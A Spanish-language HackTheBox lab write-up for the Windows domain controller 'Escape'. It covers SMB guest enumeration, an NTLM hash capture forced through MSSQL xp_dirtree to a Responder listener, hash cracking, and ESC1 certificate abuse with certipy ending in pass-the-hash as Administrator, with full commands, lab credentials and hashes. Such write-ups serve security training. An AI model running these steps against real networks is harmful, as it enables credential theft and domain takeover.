Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Medium
- Tags: #ad #certipy #esc1 #mssql #responder #nxc #smb

![](assets/Pasted%20image%2020260119171506.png)
## Reconocimiento

Comienzo con un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Desktop]
└─$ ping -c 1 10.129.228.253
PING 10.129.228.253 (10.129.228.253) 56(84) bytes of data.
64 bytes from 10.129.228.253: icmp_seq=1 ttl=127 time=111 ms

--- 10.129.228.253 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 111.216/111.216/111.216/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.228.253 -oG nmap/allPorts

Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
1433/tcp  open  ms-sql-s         syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49689/tcp open  unknown          syn-ack ttl 127
49708/tcp open  unknown          syn-ack ttl 127
49718/tcp open  unknown          syn-ack ttl 127
```

Sobre los puertos abiertos tiro un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts predeterminados.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,1433,3268,3269,5985,9389,49667,49689,49708,49718 -sV -sC -Pn -n -vvv 10.129.228.253 -oN nmap/target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-20 07:18:50Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
| MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| <MAS..>
|_-----END CERTIFICATE-----
|_ssl-date: 2026-01-20T07:20:23+00:00; +7h59m57s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.129.228.253:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-01-20T07:20:24+00:00; +7h59m58s from scanner time.
| ms-sql-ntlm-info:
|   10.129.228.253:1433:
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-20T07:15:20
| Not valid after:  2056-01-20T07:15:20
| MD5:   e679:00e9:8499:7f87:203b:b85f:0a21:b9c9
| SHA-1: 8f1c:abdc:ef7e:25b4:1d27:c57b:64b5:4215:23ed:2272
| -----BEGIN CERTIFICATE-----
| MIIDADCCAeigAwIBAgIQTzzT1XPMRLpLL0nckycVGjANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| <MAS....>
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-20T07:20:25+00:00; +7h59m57s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
| MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwIBcNMjQwMTE4MjMwMzU3WhgPMjA3NDAx
| <MAS..>
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Issuer: commonName=sequel-DC-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-18T23:03:57
| Not valid after:  2074-01-05T23:03:57
| MD5:   ee4c:c647:ebb2:c23e:f472:1d70:2880:9d82
| SHA-1: d88d:12ae:8a50:fcf1:2242:909e:3dd7:5cff:92d1:a480
| -----BEGIN CERTIFICATE-----
| MIIFkTCCBHmgAwIBAgITHgAAAAsyZYRdLEkTIgAAAAAACzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
| MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwIBcNMjQwMTE4MjMwMzU3WhgPMjA3NDAx
| <MAS..>
|_-----END CERTIFICATE-----
|_ssl-date: 2026-01-20T07:20:23+00:00; +7h59m58s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49708/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49718/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 29662/tcp): CLEAN (Timeout)
|   Check 2 (port 16305/tcp): CLEAN (Timeout)
|   Check 3 (port 12096/udp): CLEAN (Timeout)
|   Check 4 (port 48343/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-01-20T07:19:45
|_  start_date: N/A
```

Por la informacion que tengo puedo intuir que estoy contra un `DC`.

- Puerto 88 Kerberos
- Puerto 135 RPC
- Puerto 139, 445 SMB
- Puerto 383, 636 LDAP
- Puerto 1433 MSSQL
- Puerto 5985 WinRm

## Enumeración

### Puerto 445 SMB.

Saque informacion general de la maquina.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ nxc smb 10.129.228.253
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
```

- Dominio **sequel.htb**
- Nombre de la maquina **DC**

Voy a colocar esa informacion en el **/etc/hosts**

```bash
10.129.228.253 sequel.htb DC.sequel.htb DC
```

Con `netexec` puedo enumerar los shares a los que tengo acceso como **guest**: 

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ nxc smb sequel.htb -u 'guest' -p '' --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\guest:
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share
SMB         10.129.228.253  445    DC               Public          READ
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share
```

- Tengo permisos de lectura en el recurso **Public**.

También puedo enumerar usuarios validos por fuerza bruta de RID.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ nxc smb sequel.htb -u 'guest' -p '' --rid-brute
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\guest:
SMB         10.129.228.253  445    DC               498: sequel\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.228.253  445    DC               500: sequel\Administrator (SidTypeUser)
SMB         10.129.228.253  445    DC               501: sequel\Guest (SidTypeUser)
SMB         10.129.228.253  445    DC               502: sequel\krbtgt (SidTypeUser)
SMB         10.129.228.253  445    DC               512: sequel\Domain Admins (SidTypeGroup)
SMB         10.129.228.253  445    DC               513: sequel\Domain Users (SidTypeGroup)
SMB         10.129.228.253  445    DC               514: sequel\Domain Guests (SidTypeGroup)
SMB         10.129.228.253  445    DC               515: sequel\Domain Computers (SidTypeGroup)
SMB         10.129.228.253  445    DC               516: sequel\Domain Controllers (SidTypeGroup)
SMB         10.129.228.253  445    DC               517: sequel\Cert Publishers (SidTypeAlias)
SMB         10.129.228.253  445    DC               518: sequel\Schema Admins (SidTypeGroup)
SMB         10.129.228.253  445    DC               519: sequel\Enterprise Admins (SidTypeGroup)
SMB         10.129.228.253  445    DC               520: sequel\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.228.253  445    DC               521: sequel\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.228.253  445    DC               522: sequel\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.228.253  445    DC               525: sequel\Protected Users (SidTypeGroup)
SMB         10.129.228.253  445    DC               526: sequel\Key Admins (SidTypeGroup)
SMB         10.129.228.253  445    DC               527: sequel\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.228.253  445    DC               553: sequel\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.228.253  445    DC               571: sequel\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.228.253  445    DC               572: sequel\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.228.253  445    DC               1000: sequel\DC$ (SidTypeUser)
SMB         10.129.228.253  445    DC               1101: sequel\DnsAdmins (SidTypeAlias)
SMB         10.129.228.253  445    DC               1102: sequel\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.228.253  445    DC               1103: sequel\Tom.Henn (SidTypeUser)
SMB         10.129.228.253  445    DC               1104: sequel\Brandon.Brown (SidTypeUser)
SMB         10.129.228.253  445    DC               1105: sequel\Ryan.Cooper (SidTypeUser)
SMB         10.129.228.253  445    DC               1106: sequel\sql_svc (SidTypeUser)
SMB         10.129.228.253  445    DC               1107: sequel\James.Roberts (SidTypeUser)
SMB         10.129.228.253  445    DC               1108: sequel\Nicole.Thompson (SidTypeUser)
SMB         10.129.228.253  445    DC               1109: sequel\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
```

- Existen usuarios como Tom.Henn, sql_svc, Ryan.Cooper entre otros.

## Acceso Inicial.

Me voy a conectar al recurso **Public**.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ smbclient //10.129.228.253/Public -U 'guest'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 11:51:25 2022
  ..                                  D        0  Sat Nov 19 11:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

                5184255 blocks of size 4096. 1440631 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (34.6 KiloBytes/sec) (average 34.6 KiloBytes/sec)
smb: \>
```

- Existía un archivo pdf el cual me descargue

El contenido del PDF indica lo siguiente:

![](assets/Pasted%20image%2020260119172710.png)


![](assets/Pasted%20image%2020260119172728.png)

Básicamente dice que hay una instancia de MSSQL corriendo en el `DC` y se mencionan credenciales para nuevos usuarios:

- PublicUser / GuestUserCantWrite1 para MSSQL.

### Puerto 1433 MSSQL.

Voy a conectarme y a enumerar la base de datos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ impacket-mssqlclient PublicUser@10.129.228.253
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)>
```

Estas son los bases de datos:

```bash
SQL (PublicUser  guest@master)> select name from sys.databases;
name
------
master
tempdb
model
msdb
```

- Todas son estándar.

### Capturando Hash NTLM.

Una de las cosas que podemos hacer es capturar el hash del servicio MSSQL, esto lo podemos hacer haciendo uso de `responder` para levantar un servidor SMB y de la función `xp_dirtree` para forzar a mssql a autenticarse contra nuestro servidor.


- Primero preparamos el responder

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ sudo responder -I tun0
```


- Dentro de MSSQL voy a ejecutar `xp_dirtree` apuntando a mi servidor SMB.

```BASH
SQL (PublicUser  guest@master)> EXEC master..xp_dirtree '\\10.10.16.34\share\'
subdirectory   depth
------------   -----
```

- Devuelta al responder podemos ver que se capturo un hash para la cuenta `sql_svc`.

```bash

[SMB] NTLMv2-SSP Client   : 10.129.228.253
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:0b41f11aff7eaafc:8053244B1D46019002C6DDC319B9F139:0101000000000000801AF8F09B89DC0107576FB5DD3D71F20000000002000800490034004F005A0001001E00570049004E002D003400320036003700440034003000380051004300320004003400570049004E002D00340032003600370044003400300038005100430032002E00490034004F005A002E004C004F00430041004C0003001400490034004F005A002E004C004F00430041004C0005001400490034004F005A002E004C004F00430041004C0007000800801AF8F09B89DC01060004000200000008003000300000000000000000000000003000007A2C74BD1E4455A19C2149791C143D8B89511C3AF82DDDACE8B115CA0E60E9A40A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330034000000000000000000
```

Puedo crackear este hash con `hashcat`:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

SQL_SVC::sequel:0b41f11aff7eaafc:8053244b1d46019002c6ddc319b9f139:0101000000000000801af8f09b89dc0107576fb5dd3d71f20000000002000800490034004f005a0001001e00570049004e002d003400320036003700440034003000380051004300320004003400570049004e002d00340032003600370044003400300038005100430032002e00490034004f005a002e004c004f00430041004c0003001400490034004f005a002e004c004f00430041004c0005001400490034004f005a002e004c004f00430041004c0007000800801af8f09b89dc01060004000200000008003000300000000000000000000000003000007a2c74bd1e4455a19c2149791c143d8b89511c3af82dddace8b115ca0e60e9a40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00330034000000000000000000

:REGGIE1234ronnie
```

- Credenciales sql_svc / REGGIE1234ronnie

## Escalada de Privilegios

Voy a probar estas credenciales en distintos servicios:

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ nxc smb sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie'
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie

┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ nxc winrm sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie'
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

- Las credenciales son validas para SMB y WinRm.

Me voy a conectar por WinRm para ver que encuentro.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ evil-winrm -i sequel.htb -u 'sql_svc' -p 'REGGIE1234ronnie'


*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc
```

En el directorio de Users podemos ver lo siguientes usuarios:

```bash
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```


Dentro del directorio `C:\SQLServer\Logs` encontré un archivo llamado `ERRORLOG.BAK`

```bash
*Evil-WinRM* PS C:\SQLServer\Logs> ls


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLServer\Logs> download ERRORLOG.BAK
```

- Me descargue ese log.

En el log podemos ver lo siguiente:

```bash
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

- En los logs se observa un fallo de autenticación para `Ryan.Cooper`, seguido de un intento donde `NuclearMosquito3` aparece como usuario, lo que indica que la contraseña pudo haber sido introducida erróneamente en el campo de usuario.

Voy a probar estas credenciales en distintos servicios.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ nxc smb sequel.htb -u 'Ryan.Cooper' -p 'NuclearMosquito3'
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3

┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ nxc winrm sequel.htb -u 'Ryan.Cooper' -p 'NuclearMosquito3'
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!)
```

- Las credenciales funcionan para WinRm y SMB.

Me voy a conectar por winrm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ evil-winrm -i sequel.htb -u 'Ryan.Cooper' -p 'NuclearMosquito3'

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper
```

Y tenemos la primera flag.

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
01dce6793521f9**********
```

En tema de privilegios y grupos tengo los siguiente.

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

- Nada raro.

### Abusando de ESC1.

Voy a enumerar los certificados que el usuario **ryan.cooper** puede solicitar con `certipy`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ certipy find -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253 -stdout -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority                                                                                                                                                                                   [*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sequel-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...                                                                                                                           [*] Successfully retrieved CA configuration for 'sequel-DC-CA'
[*] Checking web enrollment for CA 'sequel-DC-CA' @ 'dc.sequel.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC-CA
    DNS Name                            : dc.sequel.htb                                                                                                                                                                 Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Certificate Validity Start          : 2022-11-18 20:58:46+00:00                                                                                                                                                     Certificate Validity End            : 2121-11-18 21:08:46+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 10 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2022-11-18T21:10:22+00:00
    Template Last Modified              : 2024-01-19T00:26:38+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Administrator
        Full Control Principals         : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Write Property Enroll           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Domain Users
                                          SEQUEL.HTB\Enterprise Admins
    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

- Al parecer la plantilla `UserAuthentication` es vulnerable a ESC1.

Con [CertipyPrivEscWiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation) podemos ver como abusar de esto.

ESC1 es una mala configuración que nos permite suplantar a cualquier usuario solo indicándolo en el SAN del certificado.

- Primero tengo que sacar el sid del usuario Administrator.

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> Get-ADUser administrator | Select-Object Name, SID


Name          SID
----          ---
Administrator S-1-5-21-4078382237-1492182817-2568127209-500
```

- Ahora puedo solicitar un certificado que me sirva para suplantar al usuario administrator.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ certipy req \
    -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' \
    -dc-ip '10.129.228.253' -target 'dc.sequel.htb' \
    -ca 'sequel-DC-CA' -template 'UserAuthentication' \
    -upn 'administrator@sequel.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate object SID is 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

- Con este certificado puedo pedir un TGT y obtener el hash NTLM del usuario administrator.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ certipy auth -pfx administrator.pfx -dc-ip 10.129.228.253
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*]     SAN URL SID: 'S-1-5-21-4078382237-1492182817-2568127209-500'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```


Con el hash puedo hacer Pass The Hash y conectarme por WinRm.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/escape]
└─$ evil-winrm -i sequel.htb -u administrator -H "a52f78e4c751e5f5e17e1e9f3e58f4ee"

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
```

y Obtenemos la ultima flag.

```bash
